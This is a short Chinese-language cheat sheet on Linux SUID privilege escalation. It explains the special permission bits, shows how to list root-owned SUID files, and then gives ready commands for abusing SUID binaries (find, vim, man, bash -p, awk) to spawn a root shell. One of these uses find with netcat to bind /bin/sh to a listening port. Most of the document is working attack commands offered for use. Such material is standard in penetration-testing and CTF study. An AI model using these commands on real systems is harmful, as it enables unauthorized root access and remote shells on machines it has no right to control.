# suid提权

## 1.简介

当使用ll 命令来查看文件或者目录权限时，第一列一共有 10 个字符长度，从右往左编号，即 9876543210，其中：

- 9 共 1 位表示标识位：标识当前的文件类型。如 d 表示目录，- 表示普通文件；
- 876 共 3 位表示 属主 的权限；
- 543 共 3 位表示 组用户 的权限；
- 210 共 3 位表示 其他用户 的权限

但实际上Linux 表示文件或者目录的权限，总共用了 12 个比特位

除了3个3位的权限，Linux 还有 3 个比特位来表示 `SUID` 、`SGID` 和 `SBIT` 等特殊权限：

* `SUID` 表示 `Set User IDentification`，出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限
* `SGID` 不仅可以用来控制文件权限，还能控制目录的权限
* `SBIT` 只能用来控制目录的权限，不能用来控制文件



## 2.查找有 SUID 权限位文件

从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null

```shell
find / -user root -perm -4000 -print 2>/dev/null
```



## 3.常用方式

### 3.1 find

```shell
touch test
find test -exec netcat -lvp 5555 -e /bin/sh \;
```

### 3.2 vi/vim

打开vim,按下ESC

```shell
:set shell=/bin/sh
:shell
```

### 3.3 man

```shell
man passwd
!/bin/bash
```

### 3.4 bash

```shell
bash -p
bash-3.2# id
```

### 3.5 awk

```shell
awk 'BEGIN {system("/bin/bash")}'
```

